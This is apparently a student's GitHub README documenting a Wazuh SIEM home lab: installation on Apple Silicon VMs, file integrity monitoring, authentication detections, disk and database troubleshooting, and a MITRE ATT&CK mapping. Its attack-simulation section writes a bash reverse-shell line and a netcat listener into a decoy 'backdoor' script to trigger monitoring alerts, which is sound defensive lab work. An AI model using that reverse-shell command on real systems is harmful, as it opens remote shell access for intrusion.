<div align="center">

# 🛡️ Wazuh SOC Home Lab

### *Most home labs stop when the dashboard loads. This one starts there.*

![Wazuh](https://img.shields.io/badge/Wazuh-v4.12.0-005571?style=for-the-badge&logo=wazuh&logoColor=white)
![Ubuntu](https://img.shields.io/badge/Ubuntu-26.04_LTS-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Kali](https://img.shields.io/badge/Kali_Linux-2026.1-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Apple Silicon](https://img.shields.io/badge/Apple_Silicon-ARM64-000000?style=for-the-badge&logo=apple&logoColor=white)
![VMware](https://img.shields.io/badge/VMware_Fusion-ARM64-607078?style=for-the-badge&logo=vmware&logoColor=white)
![Status](https://img.shields.io/badge/Status-Complete-2ea44f?style=for-the-badge)
![MITRE](https://img.shields.io/badge/MITRE-ATT%26CK-FF0000?style=for-the-badge)

<br/>

> Built, broken, recovered, and validated a complete Wazuh SOC environment on Apple Silicon.
> Every failure documented. Every fix explained.

</div>

---

## 📌 Table of Contents
- [What I Built](#-what-i-built)
- [Architecture](#️-architecture)
- [Installation & Setup](#-installation--setup)
- [Key Detections](#-key-detections)
- [Attack Simulation](#-attack-simulation)
- [Troubleshooting War Stories](#-troubleshooting-war-stories)
- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
- [What I Learned](#-what-i-learned)

---

## 🎯 What I Built

❌ Not a pre-built VM &nbsp;&nbsp; ❌ Not a Docker Compose file &nbsp;&nbsp; ❌ Not a tutorial follow-along

Built from a clean Ubuntu Server installation, configured entirely by hand, broken multiple times, and fixed each time.

| Capability | Status |
|---|---|
| SIEM stack deployed (manager + indexer + dashboard) | ✅ Complete |
| Live endpoint enrolled and reporting | ✅ Complete |
| Real-time auth event detection (SSH, sudo, PAM) | ✅ Complete |
| File Integrity Monitoring end-to-end | ✅ Complete |
| Attack simulation and detection | ✅ Complete |
| Disk failure diagnosis and recovery | ✅ Complete |
| MITRE ATT&CK mapping verified in dashboard | ✅ Complete |

| Metric | Value |
|---|---|
| VMs | 2 |
| Security Events Generated | 200+ |
| Major Failures Diagnosed & Fixed | 3 |
| Alert Pipeline | Fully Validated |

---

## 🏗️ Architecture

<div align="center">

```
┌─────────────────────────────────────────────┐
│           macOS Host — MacBook Pro M4        │
│                  VMware Fusion               │
└────────────────┬────────────────────────────┘
                 │
      ┌──────────┴──────────┐
      │                     │
┌─────▼──────────┐   ┌──────▼──────────┐
│  cyber-nova    │   │   kali-agent    │
│ Ubuntu 26.04   │   │ Kali Linux      │
│ 192.168.50.200 │◄──│ 192.168.50.191  │
│ Wazuh Manager  │   │ Wazuh Agent     │
│ Wazuh Indexer  │   │ v4.12.0         │
│ Wazuh Dashboard│   │ FIM, Auth,      │
│ (port 443)     │   │ Sudo, PAM       │
└────────────────┘   └─────────────────┘
```

</div>

---

## 🚀 Installation & Setup

### Phase 1 — Network Verification

> 📸 Screenshot: Kali pinging Ubuntu (192.168.50.200)

> 📸 Screenshot: Ubuntu pinging Kali (192.168.50.191)

### Phase 2 — Wazuh Stack Installation

```bash
curl -sO https://packages.wazuh.com/4.12/wazuh-install.sh
sudo bash ./wazuh-install.sh -a -i
```
**Note:** The `-i` flag bypasses the ARM64 hardware check. Required on Apple Silicon.

> 📸 Screenshot: Full successful install log

### Phase 3 — Port Conflict Resolution

SafeLine WAF Docker containers from my previous lab were holding port 443. Stopped them first.

```bash
sudo sh -c 'docker stop $(docker ps -q)'
sudo bash ./wazuh-install.sh -a -i
```

> 📸 Screenshot: Port conflict error + fix + successful reinstall

### Phase 4 — Dashboard & Agent

> 📸 Screenshot: Wazuh login page from Kali browser

> 📸 Screenshot: Wazuh dashboard overview

```bash
wget https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.12.0-1_arm64.deb \
&& sudo WAZUH_MANAGER='192.168.50.200' WAZUH_AGENT_NAME='kali-agent' dpkg -i ./wazuh-agent_4.12.0-1_arm64.deb
sudo systemctl daemon-reload && sudo systemctl enable wazuh-agent && sudo systemctl start wazuh-agent
```

> 📸 Screenshot: kali-agent ACTIVE in Endpoints dashboard

### Phase 5 — FIM Configuration

```xml
<directories check_all="yes" realtime="yes">/home/kali/test</directories>
```

> 📸 Screenshot: ossec.conf with FIM realtime config

---

## 🔍 Key Detections

### Authentication Events

| Rule ID | Description | Level |
|---|---|---|
| 5501 | PAM Login session opened | 3 |
| 5502 | PAM Login session closed | 3 |
| 5402 | Successful sudo to ROOT | 3 |
| 5403 | First time user executed sudo | 4 |

> 📸 Screenshot: 219 live PAM and sudo events in Threat Hunting

### File Integrity Monitoring

**Alert pipeline:**
Agent → wazuh-analysisd → alerts.json → wazuh-indexer → dashboard

Each alert captured: file path, event type, MD5/SHA1/SHA256 hashes, permissions, agent ID.

> 📸 Screenshot: alerts.json FIM syscheck entry with full hash capture

> 📸 Screenshot: location:syscheck in dashboard — 4 hits (file added + checksum changed)

> 📸 Screenshot: Threat Hunting — 209 total alerts, MITRE ATT&CK donut chart

---

## 💥 Attack Simulation

```bash
echo "nc -lvnp 4444" > ~/test/backdoor.sh
echo "bash -i >& /dev/tcp/192.168.50.200/4444 0>&1" >> ~/test/backdoor.sh
chmod +x ~/test/backdoor.sh
mv ~/test/backdoor.sh ~/test/system_update.sh
rm ~/test/system_update.sh
```

File creation, permission change, rename, deletion — every action detected and alerted in realtime.

> 📸 Screenshot: Attack simulation commands + Wazuh alerts firing

---

## 🔥 Troubleshooting War Stories

### 💾 War Story 1 — Disk hit 100%, manager died

```bash
df -h /        # 28G 28G 0 100%
sudo du -h --max-depth=2 /var/ossec | sort -h | tail -5
# 6.4G /var/ossec/queue/vd_updater  ← culprit
```

CVE scanner silently filled the disk. Fixed by deleting vd_updater and disabling vuln-detection:

```xml
<vulnerability-detection><enabled>no</enabled></vulnerability-detection>
```

> 📸 Screenshot: Disk 100% → diagnosed → recovered

### 📦 War Story 2 — LVM using half its space

```bash
sudo vgs    # VFree: 28.47g available but unused
sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
df -h /     # 56G  23G  32G  42%
```

> 📸 Screenshot: Before and after — 28GB → 56GB

### 🔍 War Story 3 — FIM alerts invisible in dashboard

Searched everywhere on the agent. Nothing. The mistake: **agents don't generate alerts — managers do.**

```bash
# On UBUNTU (manager), not Kali:
sudo grep syscheck /var/ossec/logs/alerts/alerts.json | tail -5
# ERROR: dbsync: Bad response from database: Cannot save Syscheck
```

FIM database was corrupted. Rebuilt wazuh-db, restarted pipeline. Alerts appeared immediately.

> 📸 Screenshot: FIM alert in alerts.json + confirmed in dashboard

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | Triggered By |
|---|---|---|
| Privilege Escalation | T1548 — Sudo Caching | sudo on Kali |
| Defense Evasion | T1548 — Elevation Control | sudo escalation |
| Initial Access | T1078 — Valid Accounts | PAM auth events |
| Persistence | T1078 — Valid Accounts | Session events |

> 📸 Screenshot: MITRE ATT&CK panel in kali-agent dashboard

---

## 💡 What I Learned

- The Wazuh alert pipeline end to end — by breaking each stage and fixing it
- Linux disk management under pressure — LVM extension, live filesystem resize
- Agents watch and send. Managers process and alert. Never debug on the wrong machine.
- Raw logs (`ossec.log`, `alerts.json`) tell the truth when the UI shows nothing

---

## 🎓 Skills Demonstrated

`Wazuh SIEM` `Log Analysis` `FIM` `Endpoint Monitoring` `Alert Triage` `Incident Response` `Threat Hunting` `MITRE ATT&CK` `Linux Admin` `LVM` `VMware Fusion` `ARM64` `Troubleshooting` `OpenSearch`

---

<div align="center">

**Samruddhi (Sam) Patil** — Aspiring SOC Analyst

[![GitHub](https://img.shields.io/badge/GitHub-samSecurity04-181717?style=for-the-badge&logo=github)](https://github.com/samSecurity04)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-samruddhi--p--patil-0A66C2?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/samruddhi-p-patil/)

🎓 CompTIA Security+ &nbsp;|&nbsp; Microsoft SC-900 &nbsp;|&nbsp; EC-Council CASE (Java) &nbsp;|&nbsp; Google Cybersecurity

*Built for educational purposes. All simulations conducted in an isolated lab environment.*

</div>
